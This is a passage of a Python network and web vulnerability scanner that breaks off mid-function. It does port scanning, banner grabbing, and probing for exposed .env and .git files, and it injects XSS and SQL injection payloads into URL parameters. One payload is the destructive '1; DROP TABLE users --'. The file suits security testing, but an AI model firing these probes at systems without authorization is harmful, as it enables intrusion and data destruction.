#!/usr/bin/env python3
"""
Enterprise Network Security Assessment Suite

A comprehensive Python security platform for network and application vulnerability assessment
with selective exploitation capabilities for authorized penetration testing.

This tool is designed for professional security teams conducting authorized security assessments.

Usage:
    python enterprise_security_suite.py --target [IP/URL] --assessment-type [standard|advanced|pentest]
"""

import argparse
import socket
import ssl
import sys
import os
import json
import time
import random
import string
import ipaddress
import hashlib
import base64
import concurrent.futures
import logging
import re
import urllib3
import requests
import threading
import subprocess
import platform
import ftplib
import paramiko
import xml.etree.ElementTree as ET
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, TaskID, BarColumn, TextColumn, TimeRemainingColumn
from rich.panel import Panel
from rich.text import Text
from rich.logging import RichHandler
from rich.layout import Layout
from rich.live import Live

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
    datefmt="[%X]",
    handlers=[RichHandler(rich_tracebacks=True)]
)

# Suppress insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global constants
VERSION = "2.0.0"
DEFAULT_THREADS = 20
DEFAULT_TIMEOUT = 10
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
]

class EnterpriseSecuritySuite:
    def __init__(self, target, assessment_type="standard", threads=DEFAULT_THREADS, 
                 timeout=DEFAULT_TIMEOUT, verbosity=1, exploit=False, output_dir="reports"):
        """Initialize the security assessment platform."""
        self.target = target
        self.assessment_type = assessment_type
        self.threads = threads
        self.timeout = timeout
        self.verbosity = verbosity
        self.exploit_enabled = exploit
        self.output_dir = output_dir
        
        # Create output directory if it doesn't exist
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        # Initialize console for rich output
        self.console = Console()
        
        # Generate a unique assessment ID
        self.assessment_id = self._generate_assessment_id()
        
        # Setup results structure
        self.results = {
            "metadata": {
                "assessment_id": self.assessment_id,
                "target": target,
                "assessment_type": assessment_type,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "version": VERSION
            },
            "summary": {
                "total_vulnerabilities": 0,
                "severity_counts": {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0},
                "scan_duration": 0,
                "exploitable_vulnerabilities": 0,
                "exploitation_attempts": 0,
                "successful_exploits": 0
            },
            "network_assessment": {
                "ip_information": {},
                "open_ports": [],
                "services": [],
                "network_vulnerabilities": []
            },
            "web_assessment": {
                "server_information": {},
                "technologies": [],
                "webapp_vulnerabilities": [],
                "api_endpoints": [],
                "authentication_issues": []
            },
            "system_assessment": {
                "os_detection": {},
                "service_vulnerabilities": [],
                "misconfigurations": []
            },
            "exploitation": {
                "attempts": [],
                "successes": []
            },
            "recommendations": {
                "critical_actions": [],
                "remediation_plan": [],
                "best_practices": []
            }
        }
        
        # Module execution status tracking
        self.modules_status = {}
        
        # Target information
        self.is_ip = self._is_ip_address(target)
        self.target_ip = target if self.is_ip else None
        self.target_hostname = None if self.is_ip else target
        
        # For exploitation
        self.discovered_credentials = []
        self.potential_exploits = []
        
        # Setup known vulnerability database (simplified for this implementation)
        self.vuln_database = self._initialize_vuln_database()
        
        # Track scan start time
        self.start_time = None

    def _generate_recommendations(self):
        """Generate recommendations based on findings."""
        recommendations = []
        
        # Example: Generate recommendations for missing security headers
        if any(vuln["type"] == "missing_security_headers" for vuln in self.results["web_assessment"]["webapp_vulnerabilities"]):
            recommendations.append("Consider adding missing security headers to improve web application security.")
        
        # Example: Generate recommendations for detected outdated software versions
        if any(vuln["type"] == "outdated_apache" for vuln in self.results["web_assessment"]["webapp_vulnerabilities"]):
            recommendations.append("Upgrade to the latest version of Apache to avoid known vulnerabilities.")
        
        # Add these to the results
        self.results["recommendations"]["best_practices"] = recommendations
        
        # Optionally print recommendations to the console
        for recommendation in recommendations:
            self._add_detail_message(f"Recommendation: {recommendation}", "info")

    def _generate_assessment_id(self):
        """Generate a unique ID for this assessment."""
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        random_suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        return f"ENSA-{timestamp}-{random_suffix}"
    
    def _is_ip_address(self, address):
        """Check if the provided address is an IP address."""
        try:
            ipaddress.ip_address(address)
            return True
        except ValueError:
            return False
    
    def _initialize_vuln_database(self):
        """Initialize a simplified vulnerability database."""
        # In a real implementation, this would load from a file or API
        vuln_db = {
            "services": {
                "ftp": {
                    "CVE-2021-3618": {
                        "description": "Anonymous FTP access enabled",
                        "severity": "Medium",
                        "exploitation": "anonymous_ftp_login",
                        "affected_versions": ["*"],
                        "remediation": "Disable anonymous FTP access"
                    }
                },
                "ssh": {
                    "CVE-2020-14145": {
                        "description": "OpenSSH through 8.3p1 vulnerability for username enumeration",
                        "severity": "Medium",
                        "exploitation": "ssh_user_enum",
                        "affected_versions": ["<8.4"],
                        "remediation": "Upgrade OpenSSH to version 8.4 or later"
                    }
                },
                "http": {
                    "CVE-2021-44228": {
                        "description": "Apache Log4j Remote Code Execution (Log4Shell)",
                        "severity": "Critical",
                        "exploitation": "log4j_check",
                        "affected_versions": ["2.0-2.14.1"],
                        "remediation": "Update Log4j to 2.15.0 or later, or apply recommended mitigations"
                    }
                },
                "https": {
                    "CVE-2021-44228": {
                        "description": "Apache Log4j Remote Code Execution (Log4Shell)",
                        "severity": "Critical",
                        "exploitation": "log4j_check",
                        "affected_versions": ["2.0-2.14.1"],
                        "remediation": "Update Log4j to 2.15.0 or later, or apply recommended mitigations"
                    }
                },
                "smb": {
                    "CVE-2017-0144": {
                        "description": "SMBv1 vulnerability (EternalBlue)",
                        "severity": "Critical",
                        "exploitation": "eternalblue_check",
                        "affected_versions": ["Windows Server 2008", "Windows 7", "Windows 2003", "Windows XP"],
                        "remediation": "Apply MS17-010 security update"
                    }
                },
                "mysql": {
                    "CVE-2021-2307": {
                        "description": "MySQL Server Privilege Escalation",
                        "severity": "High",
                        "exploitation": "mysql_auth_bypass_check",
                        "affected_versions": ["8.0.22", "8.0.23"],
                        "remediation": "Upgrade MySQL to 8.0.24 or later"
                    }
                }
            },
            "web": {
                "sqli": {
                    "description": "SQL Injection vulnerability",
                    "severity": "High",
                    "exploitation": "sql_injection_exploit",
                    "remediation": "Use parameterized queries and input validation"
                },
                "xss": {
                    "description": "Cross-site Scripting (XSS) vulnerability",
                    "severity": "Medium",
                    "exploitation": "xss_exploit",
                    "remediation": "Implement Content-Security-Policy and proper output encoding"
                },
                "csrf": {
                    "description": "Cross-site Request Forgery (CSRF) vulnerability",
                    "severity": "Medium",
                    "exploitation": "csrf_test",
                    "remediation": "Implement anti-CSRF tokens and SameSite cookies"
                },
                "ssrf": {
                    "description": "Server-side Request Forgery (SSRF) vulnerability",
                    "severity": "High",
                    "exploitation": "ssrf_test",
                    "remediation": "Validate and sanitize user-supplied URLs"
                },
                "lfi": {
                    "description": "Local File Inclusion vulnerability",
                    "severity": "High",
                    "exploitation": "lfi_exploit",
                    "remediation": "Validate file paths and limit file access"
                }
            }
        }
        return vuln_db
    
    def run_assessment(self):
        """Execute the security assessment based on the specified type."""
        self.start_time = time.time()
        
        # Initialize terminal UI
        self._setup_terminal_ui()
        
        try:
            # Resolve IP/hostname if needed
            self._resolve_target()
            
            # Run assessment modules based on assessment type
            if self.assessment_type in ["standard", "advanced", "pentest"]:
                # All assessment types include basic network scanning
                self._run_port_scan()
                
                # Standard+ adds service detection and web scanning
                if self.assessment_type in ["standard", "advanced", "pentest"]:
                    self._identify_services()
                    if not self.is_ip or self._has_web_services():
                        self._run_web_assessment()
                
                # Advanced+ adds vulnerability checks
                if self.assessment_type in ["advanced", "pentest"]:
                    self._check_service_vulnerabilities()
                    self._check_system_vulnerabilities()
                    
                    if not self.is_ip or self._has_web_services():
                        self._run_advanced_web_assessment()
                
                # Pentest adds exploitation if enabled
                if self.assessment_type == "pentest" and self.exploit_enabled:
                    self._run_exploitation()
            
            # Generate recommendations based on findings
            self._generate_recommendations()
            
            # Calculate total assessment duration
            assessment_duration = time.time() - self.start_time
            self.results["summary"]["scan_duration"] = round(assessment_duration, 2)
            
            # Generate report
            self._generate_report()
            
        except Exception as e:
            logging.error(f"Assessment error: {str(e)}")
            if self.verbosity > 1:
                import traceback
                logging.error(traceback.format_exc())
        
        finally:
            # Ensure we close the live display
            if hasattr(self, 'live') and self.live:
                self.live.stop()
                
            # Display final summary
            self._display_assessment_summary()
        
        return self.results
    
    def _generate_recommendations(self):
        """Generate recommendations based on findings."""
        recommendations = []
        
        # Example: Generate recommendations for missing security headers
        if any(vuln["type"] == "missing_security_headers" for vuln in self.results["web_assessment"]["webapp_vulnerabilities"]):
            recommendations.append("Consider adding missing security headers to improve web application security.")
        
        # Example: Generate recommendations for detected outdated software versions
        if any(vuln["type"] == "outdated_apache" for vuln in self.results["web_assessment"]["webapp_vulnerabilities"]):
            recommendations.append("Upgrade to the latest version of Apache to avoid known vulnerabilities.")
        
        # Add these to the results
        self.results["recommendations"]["best_practices"] = recommendations
        
        # Optionally print recommendations to the console
        for recommendation in recommendations:
            self._add_detail_message(f"Recommendation: {recommendation}", "info")

    def _setup_terminal_ui(self):
        """Set up the terminal user interface for the assessment."""
        # Create the layout
        self.layout = Layout()
        
        # Split the layout into sections
        self.layout.split(
            Layout(name="header", size=3),
            Layout(name="body"),
            Layout(name="footer", size=3)
        )
        
        # Split the body section into progress and details
        self.layout["body"].split_row(
            Layout(name="progress", ratio=1),
            Layout(name="details", ratio=2)
        )
        
        # Create the header panel
        header_content = Text(f"Enterprise Network Security Assessment Suite v{VERSION}", style="bold blue")
        header_content.append(f"\nTarget: {self.target}  |  Assessment Type: {self.assessment_type.upper()}", style="green")
        self.layout["header"].update(Panel(header_content, border_style="blue"))
        
        # Create the footer panel
        footer_text = Text("Press Ctrl+C to abort assessment", style="yellow")
        self.layout["footer"].update(Panel(footer_text, border_style="blue"))
        
        # Create progress panel
        self.progress_panel = Panel("Initializing...", title="Progress", border_style="green")
        self.layout["progress"].update(self.progress_panel)
        
        # Create details panel
        self.details_panel = Panel("Assessment details will appear here...", title="Details", border_style="green")
        self.layout["details"].update(self.details_panel)
        
        # Start live display
        self.live = Live(self.layout, refresh_per_second=4)
        self.live.start()
        
        # Initialize progress bar
        self.progress = Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeRemainingColumn()
        )
        
        # Main assessment task
        self.main_task = self.progress.add_task("[green]Overall Assessment Progress", total=100)
        
        # Update the progress panel
        self.layout["progress"].update(Panel(self.progress, title="Progress", border_style="green"))
    
    def _update_progress(self, percentage, status_message):
        """Update the progress indicator and status message."""
        self.progress.update(self.main_task, completed=percentage)
        self.modules_status["current_module"] = status_message
        
        # Build status text from all module statuses
        status_text = []
        for module, status in self.modules_status.items():
            if module != "current_module":
                icon = "✓" if status == "Complete" else "⋯" if status == "In Progress" else "⨯"
                status_text.append(f"{icon} {module}: {status}")
        
        # Add current module
        if "current_module" in self.modules_status:
            status_text.insert(0, f"[bold yellow]» {self.modules_status['current_module']}[/bold yellow]")
        
        # Update details panel
        self.layout["details"].update(Panel("\n".join(status_text), title="Assessment Status", border_style="green"))
    
    def _add_detail_message(self, message, message_type="info"):
        """Add a message to the details panel."""
        # Type can be "info", "warning", "error", "success"
        style_map = {
            "info": "blue",
            "warning": "yellow",
            "error": "red",
            "success": "green",
            "finding": "magenta"
        }
        
        # Get existing content
        content = self.details_panel.renderable
        if isinstance(content, str):
            content = Text(content)
        
        # Append new message
        timestamp = datetime.now().strftime("%H:%M:%S")
        content.append(f"\n[{timestamp}] ")
        content.append(message, style=style_map.get(message_type, "white"))
        
        # Update the panel
        self.layout["details"].update(Panel(content, title="Details", border_style="green"))
    
    def _resolve_target(self):
        """Resolve the target to both IP and hostname if possible."""
        self._update_progress(5, "Resolving target")
        self.modules_status["Target Resolution"] = "In Progress"
        
        try:
            if self.is_ip:
                self.target_ip = self.target
                try:
                    self.target_hostname = socket.gethostbyaddr(self.target_ip)[0]
                except socket.herror:
                    self.target_hostname = None
            else:
                try:
                    self.target_ip = socket.gethostbyname(self.target)
                except socket.gaierror:
                    raise ValueError(f"Could not resolve hostname {self.target}")
                self.target_hostname = self.target
            
            # Record in results
            self.results["network_assessment"]["ip_information"] = {
                "ip_address": self.target_ip,
                "hostname": self.target_hostname,
                "is_private": self._is_private_ip(self.target_ip) if self.target_ip else None
            }
            
            self._add_detail_message(f"Resolved target: {self.target} → IP: {self.target_ip}, Hostname: {self.target_hostname}", "success")
            self.modules_status["Target Resolution"] = "Complete"
            
        except Exception as e:
            self._add_detail_message(f"Error resolving target: {e}", "error")
            self.modules_status["Target Resolution"] = "Failed"
            raise
    
    def _is_private_ip(self, ip):
        """Check if an IP address is in a private range."""
        return ipaddress.ip_address(ip).is_private
    
    def _run_port_scan(self):
        """Run a port scan on the target IP."""
        self._update_progress(10, "Performing port scan")
        self.modules_status["Port Scan"] = "In Progress"
        self._add_detail_message("Starting port scan", "info")
        
        try:
            # Define ports to scan based on assessment type
            if self.assessment_type == "standard":
                # Standard scan: Common ports only
                ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 
                         1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443]
            else:
                # Advanced/Pentest: More comprehensive
                ports = list(range(1, 1001)) + [1433, 1521, 2049, 3306, 3389, 5432, 
                                              5900, 5901, 6379, 8080, 8443, 8888, 9000]
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
                future_to_port = {executor.submit(self._check_port, self.target_ip, port): port for port in ports}
                
                total_ports = len(ports)
                completed_ports = 0
                
                # Prepare a progress tracker just for port scanning
                port_scan_progress = 0
                
                for future in concurrent.futures.as_completed(future_to_port):
                    port = future_to_port[future]
                    completed_ports += 1
                    port_scan_progress = (completed_ports / total_ports) * 100
                    
                    # Update the main progress (port scan is ~20% of the entire assessment)
                    overall_progress = 10 + (port_scan_progress * 0.1)
                    self._update_progress(overall_progress, f"Port scanning ({completed_ports}/{total_ports})")
            
            open_port_count = len(self.results["network_assessment"]["open_ports"])
            self._add_detail_message(f"Port scan complete. Found {open_port_count} open ports.", "success")
            self.modules_status["Port Scan"] = "Complete"
            
        except Exception as e:
            self._add_detail_message(f"Error during port scan: {e}", "error")
            self.modules_status["Port Scan"] = "Failed"
            raise
    
    def _check_port(self, ip, port):
        """Check if a specific port is open."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((ip, port))
            
            if result == 0:
                self.results["network_assessment"]["open_ports"].append(port)
                self._add_detail_message(f"Port {port} is open", "finding")
            
            sock.close()
            
        except Exception as e:
            if self.verbosity > 1:
                self._add_detail_message(f"Error checking port {port}: {e}", "error")
    
    def _identify_services(self):
        """Identify services running on open ports."""
        self._update_progress(20, "Identifying services")
        self.modules_status["Service Identification"] = "In Progress"
        self._add_detail_message("Starting service identification", "info")
        
        try:
            open_ports = self.results["network_assessment"]["open_ports"]
            
            if not open_ports:
                self._add_detail_message("No open ports to identify services on", "warning")
                self.modules_status["Service Identification"] = "Complete"
                return
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
                future_to_port = {executor.submit(self._identify_service, self.target_ip, port): port for port in open_ports}
                
                total_ports = len(open_ports)
                completed_ports = 0
                
                for future in concurrent.futures.as_completed(future_to_port):
                    port = future_to_port[future]
                    completed_ports += 1
                    
                    # Update the main progress (service identification is ~10% of the entire assessment)
                    overall_progress = 20 + ((completed_ports / total_ports) * 10)
                    self._update_progress(overall_progress, f"Identifying services ({completed_ports}/{total_ports})")
            
            self._add_detail_message(f"Service identification complete. Identified {len(self.results['network_assessment']['services'])} services.", "success")
            self.modules_status["Service Identification"] = "Complete"
            
        except Exception as e:
            self._add_detail_message(f"Error during service identification: {e}", "error")
            self.modules_status["Service Identification"] = "Failed"
            raise
    
    def _identify_service(self, ip, port):
        """Attempt to identify the service running on a port."""
        common_ports = {
            21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns",
            80: "http", 110: "pop3", 139: "netbios", 143: "imap", 
            443: "https", 445: "smb", 1433: "mssql", 1521: "oracle",
            3306: "mysql", 3389: "rdp", 5432: "postgresql", 5900: "vnc",
            8080: "http-proxy", 8443: "https-alt"
        }
        
        try:
            service_name = common_ports.get(port, "unknown")
            banner = None
            version = None
            
            # Try to get banner for better identification
            if port in [21, 22, 25, 110, 143]:
                banner, version = self._get_banner(ip, port)
            elif port in [80, 443, 8080, 8443]:
                banner, version = self._get_http_banner(ip, port)
                service_name = "https" if port in [443, 8443] or "HTTPS" in banner else "http"
            
            service_info = {
                "port": port,
                "service": service_name,
                "banner": banner,
                "version": version
            }
            
            self.results["network_assessment"]["services"].append(service_info)
            
            if version:
                self._add_detail_message(f"Port {port}: {service_name} (version: {version})", "finding")
            else:
                self._add_detail_message(f"Port {port}: {service_name}", "finding")
            
        except Exception as e:
            if self.verbosity > 1:
                self._add_detail_message(f"Error identifying service on port {port}: {e}", "error")
    
    def _get_banner(self, ip, port):
        """Attempt to get a service banner from the specified port."""
        banner = None
        version = None
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((ip, port))
            
            # For FTP
            if port == 21:
                banner_data = sock.recv(1024)
                banner = banner_data.decode('utf-8', 'ignore').strip()
                # Extract version from banner like "220 ProFTPD 1.3.5e Server"
                version_match = re.search(r'(\d+\.\d+[\.\w]+)', banner)
                if version_match:
                    version = version_match.group(1)
            
            # For SSH
            elif port == 22:
                banner_data = sock.recv(1024)
                banner = banner_data.decode('utf-8', 'ignore').strip()
                # Extract version from banner like "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1"
                version_match = re.search(r'SSH-\d+\.\d+-(\S+)', banner)
                if version_match:
                    version = version_match.group(1)
            
            # For SMTP, POP3, IMAP
            elif port in [25, 110, 143]:
                banner_data = sock.recv(1024)
                banner = banner_data.decode('utf-8', 'ignore').strip()
                # Try to extract version from banner
                version_match = re.search(r'(\d+\.\d+[\.\w]+)', banner)
                if version_match:
                    version = version_match.group(1)
            
            sock.close()
            
        except Exception:
            pass
        
        return banner, version
    
    def _get_http_banner(self, ip, port):
        """Get HTTP server information."""
        banner = None
        version = None
        
        try:
            protocol = "https" if port in [443, 8443] else "http"
            url = f"{protocol}://{ip}:{port}"
            
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            response = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
            
            server_header = response.headers.get('Server')
            if server_header:
                banner = f"Server: {server_header}"
                # Try to extract version from header like "Apache/2.4.41 (Ubuntu)"
                version_match = re.search(r'(\d+\.\d+[\.\w]+)', server_header)
                if version_match:
                    version = version_match.group(1)
            
        except Exception:
            pass
        
        return banner, version
    
    def _has_web_services(self):
        """Check if the target has web services running."""
        web_ports = [80, 443, 8080, 8443]
        services = self.results["network_assessment"]["services"]
        
        for service in services:
            if service["port"] in web_ports or service["service"] in ["http", "https"]:
                return True
        
        return False
    
    def _run_web_assessment(self):
        """Perform web application assessment."""
        self._update_progress(30, "Web application assessment")
        self.modules_status["Web Assessment"] = "In Progress"
        self._add_detail_message("Starting web application assessment", "info")
        
        try:
            # Find all web services
            web_endpoints = []
            for service in self.results["network_assessment"]["services"]:
                if service["service"] in ["http", "https"]:
                    protocol = service["service"]
                    port = service["port"]
                    if self.target_hostname:
                        url = f"{protocol}://{self.target_hostname}:{port}"
                        web_endpoints.append(url)
                    url = f"{protocol}://{self.target_ip}:{port}"
                    if url not in web_endpoints:
                        web_endpoints.append(url)
            
            if not web_endpoints:
                self._add_detail_message("No web services found for assessment", "warning")
                self.modules_status["Web Assessment"] = "Complete"
                return
            
            # Assess each web endpoint
            total_endpoints = len(web_endpoints)
            for i, url in enumerate(web_endpoints):
                progress_percentage = 30 + ((i / total_endpoints) * 10)
                self._update_progress(progress_percentage, f"Assessing web endpoint ({i+1}/{total_endpoints}): {url}")
                
                # Get basic server information
                self._get_web_server_info(url)
                
                # Check for common web vulnerabilities
                self._check_basic_web_vulnerabilities(url)
                
                # Directory discovery (limited)
                self._discover_web_directories(url)
            
            self._add_detail_message("Web application assessment complete", "success")
            self.modules_status["Web Assessment"] = "Complete"
            
        except Exception as e:
            self._add_detail_message(f"Error during web assessment: {e}", "error")
            self.modules_status["Web Assessment"] = "Failed"
            raise
    
    def _get_web_server_info(self, url):
        """Get information about the web server."""
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            response = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
            
            server_info = {
                "url": url,
                "status_code": response.status_code,
                "server": response.headers.get('Server', 'Unknown'),
                "technologies": []
            }
            
            # Check for common technologies and frameworks
            tech_indicators = {
                "WordPress": ["wp-content", "wp-includes", "wp-admin"],
                "Drupal": ["drupal", "sites/all", "sites/default"],
                "Joomla": ["com_content", "com_users", "com_contact"],
                "Django": ["__debug__", "csrftoken", "django"],
                "Rails": ["rails", "phusion", "ruby"],
                "Laravel": ["laravel_session"],
                "ASP.NET": ["asp.net", "__VIEWSTATE", "__VIEWSTATEGENERATOR"],
                "PHP": ["php", "PHPSESSID"],
                "jQuery": ["jquery"],
                "Bootstrap": ["bootstrap"],
                "React": ["react", "reactjs"],
                "Angular": ["angular", "ng-"],
                "Vue": ["vue", "vuejs"]
            }
            
            # Check response headers for technology indicators
            for header, value in response.headers.items():
                for tech, indicators in tech_indicators.items():
                    if any(ind.lower() in value.lower() for ind in indicators):
                        if tech not in server_info["technologies"]:
                            server_info["technologies"].append(tech)
            
            # Check response content for technology indicators
            for tech, indicators in tech_indicators.items():
                if any(ind.lower() in response.text.lower() for ind in indicators):
                    if tech not in server_info["technologies"]:
                        server_info["technologies"].append(tech)
            
            # Record the server information
            self.results["web_assessment"]["server_information"][url] = server_info
            self._add_detail_message(f"Web server at {url}: {server_info['server']}", "info")
            
            if server_info["technologies"]:
                self._add_detail_message(f"Detected technologies: {', '.join(server_info['technologies'])}", "finding")
                self.results["web_assessment"]["technologies"].extend(server_info["technologies"])
            
        except Exception as e:
            self._add_detail_message(f"Error getting web server info for {url}: {str(e)}", "error")
    
    def _check_basic_web_vulnerabilities(self, url):
        """Check for basic web vulnerabilities."""
        try:
            # Check for missing security headers
            self._check_security_headers(url)
            
            # Check for information disclosure
            self._check_info_disclosure(url)
            
            # Basic XSS test with simple payloads
            self._check_xss_vulnerability(url)
            
            # Basic SQLi test with simple payloads
            self._check_sqli_vulnerability(url)
            
        except Exception as e:
            self._add_detail_message(f"Error checking web vulnerabilities for {url}: {str(e)}", "error")
    
    def _check_security_headers(self, url):
        """Check for missing security headers."""
        security_headers = {
            "Strict-Transport-Security": "Missing HSTS header - helps prevent SSL stripping attacks",
            "Content-Security-Policy": "Missing CSP header - helps prevent XSS attacks",
            "X-Content-Type-Options": "Missing X-Content-Type-Options header - helps prevent MIME sniffing attacks",
            "X-Frame-Options": "Missing X-Frame-Options header - helps prevent clickjacking attacks",
            "X-XSS-Protection": "Missing X-XSS-Protection header - helps prevent XSS attacks",
            "Referrer-Policy": "Missing Referrer-Policy header - controls how much referrer information is included"
        }
        
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            response = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
            
            missing_headers = []
            for header, description in security_headers.items():
                if header not in response.headers:
                    missing_headers.append({"header": header, "description": description})
            
            if missing_headers:
                vuln = {
                    "type": "missing_security_headers",
                    "url": url,
                    "severity": "Medium",
                    "details": f"Found {len(missing_headers)} missing security headers",
                    "missing_headers": missing_headers
                }
                self.results["web_assessment"]["webapp_vulnerabilities"].append(vuln)
                self.results["summary"]["total_vulnerabilities"] += 1
                self.results["summary"]["severity_counts"]["Medium"] += 1
                
                self._add_detail_message(f"Security issue: Missing security headers at {url}", "finding")
                
        except Exception as e:
            if self.verbosity > 1:
                self._add_detail_message(f"Error checking security headers for {url}: {str(e)}", "error")
    
    def _check_info_disclosure(self, url):
        """Check for information disclosure issues."""
        info_disclosure_paths = [
            "robots.txt",
            ".git/HEAD",
            ".env",
            "config.php",
            "wp-config.php.bak",
            ".htaccess",
            "phpinfo.php",
            "server-status",
            ".svn/entries",
            ".well-known/"
        ]
        
        for path in info_disclosure_paths:
            try:
                test_url = urljoin(url, path)
                headers = {"User-Agent": random.choice(USER_AGENTS)}
                response = requests.get(test_url, headers=headers, timeout=self.timeout, verify=False)
                
                if response.status_code == 200:
                    # Check content to avoid false positives
                    if path == "robots.txt" and "user-agent" in response.text.lower():
                        self._add_detail_message(f"Found robots.txt at {test_url}", "finding")
                    elif path == ".git/HEAD" and "ref:" in response.text:
                        vuln = {
                            "type": "git_exposure",
                            "url": test_url,
                            "severity": "High",
                            "details": "Git repository information exposed"
                        }
                        self.results["web_assessment"]["webapp_vulnerabilities"].append(vuln)
                        self.results["summary"]["total_vulnerabilities"] += 1
                        self.results["summary"]["severity_counts"]["High"] += 1
                        self._add_detail_message(f"High severity: Git repository exposed at {test_url}", "finding")
                    elif path == ".env" and "=" in response.text:
                        vuln = {
                            "type": "env_exposure",
                            "url": test_url,
                            "severity": "Critical",
                            "details": "Environment file exposed with possible sensitive data"
                        }
                        self.results["web_assessment"]["webapp_vulnerabilities"].append(vuln)
                        self.results["summary"]["total_vulnerabilities"] += 1
                        self.results["summary"]["severity_counts"]["Critical"] += 1
                        self._add_detail_message(f"Critical severity: Environment file exposed at {test_url}", "finding")
                    elif "phpinfo" in path and ("phpinfo()" in response.text or "PHP Version" in response.text):
                        vuln = {
                            "type": "phpinfo_exposure",
                            "url": test_url,
                            "severity": "Medium",
                            "details": "PHPInfo page exposed revealing server configuration"
                        }
                        self.results["web_assessment"]["webapp_vulnerabilities"].append(vuln)
                        self.results["summary"]["total_vulnerabilities"] += 1
                        self.results["summary"]["severity_counts"]["Medium"] += 1
                        self._add_detail_message(f"Medium severity: PHPInfo exposed at {test_url}", "finding")
                
            except Exception:
                # Silently continue on error
                pass
    
    def _check_xss_vulnerability(self, url):
        """Check for basic XSS vulnerabilities."""
        # Parse URL to find parameters to test
        parsed_url = urlparse(url)
        if not parsed_url.query:
            # Look for forms to test
            try:
                headers = {"User-Agent": random.choice(USER_AGENTS)}
                response = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
                
                # Very basic form detection - in a real scanner this would be more sophisticated
                if "<form" in response.text.lower():
                    self._add_detail_message(f"Found form on {url}, potential XSS test point", "info")
                return
            except Exception:
                return
        
        # Test parameters for XSS
        params = parse_qs(parsed_url.query)
        test_payloads = [
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "javascript:alert(1)"
        ]
        
        for param in params:
            for payload in test_payloads:
                try:
                    # Create a test URL with the XSS payload
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload
                    
                    query_string = "&".join(f"{k}={requests.utils.quote(v)}" for k, v in test_params.items())
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"
                    
                    headers = {"User-Agent": random.choice(USER_AGENTS)}
                    response = requests.get(test_url, headers=headers, timeout=self.timeout, verify=False)
                    
                    # Very basic check - in a real scanner more sophisticated techniques would be used
                    if payload in response.text:
                        vuln = {
                            "type": "potential_xss",
                            "url": url,
                            "parameter": param,
                            "payload": payload,
                            "severity": "High",
                            "details": f"Potential XSS vulnerability in parameter '{param}'"
                        }
                        self.results["web_assessment"]["webapp_vulnerabilities"].append(vuln)
                        self.results["summary"]["total_vulnerabilities"] += 1
                        self.results["summary"]["severity_counts"]["High"] += 1
                        
                        self._add_detail_message(f"High severity: Potential XSS in parameter '{param}' at {url}", "finding")
                        break  # Found a vulnerability, no need to try other payloads
                    
                except Exception:
                    # Silently continue on error
                    pass
    
    def _check_sqli_vulnerability(self, url):
        """Check for basic SQL injection vulnerabilities."""
        # Parse URL to find parameters to test
        parsed_url = urlparse(url)
        if not parsed_url.query:
            return
        
        # Test parameters for SQLi
        params = parse_qs(parsed_url.query)
        test_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "1' OR '1'='1",
            "admin' --",
            "1; DROP TABLE users --"
        ]
        
        # Error patterns that might indicate SQL injection
        error_patterns = [
            "sql syntax",
            "syntax error",
            "mysql_fetch",
            "sql server",
            "ORA-",
            "postgresql query failed",
            "division by zero",
            "supplied argument is not a valid mysql",
            "unclosed quotation mark",
            "pg_query()"
        ]
        
        for param in params:
            for payload in test_payloads:
                try:
                    # Create a test URL with the SQLi payload
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload
                    
                    query_string = "&".join(f"{k}={requests.utils.quote(v)}" for k, v in test_params.items())
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"
                    
                    headers = {"User-Agent": random.choice(USER_AGENTS)}
                    response = requests.get(test_url, headers=headers, timeout=self.timeout, verify=False)
                    
                    # Look for SQL error messages in the response
                    for pattern in error_patterns:
                        if pattern.lower() in response.text.lower():
                            vuln = {
                                "type": "potential_sqli",
                                "url": url,
                                "parameter": param,
                                "payload": payload,
                                "severity": "High",
                                "details": f"Potential SQL injection in parameter '{param}'"
                            }
                            self.results["web_assessment"]["webapp_vulnerabilities"].append(vuln)
                            self.results["summary"]["total_vulnerabilities"] += 1
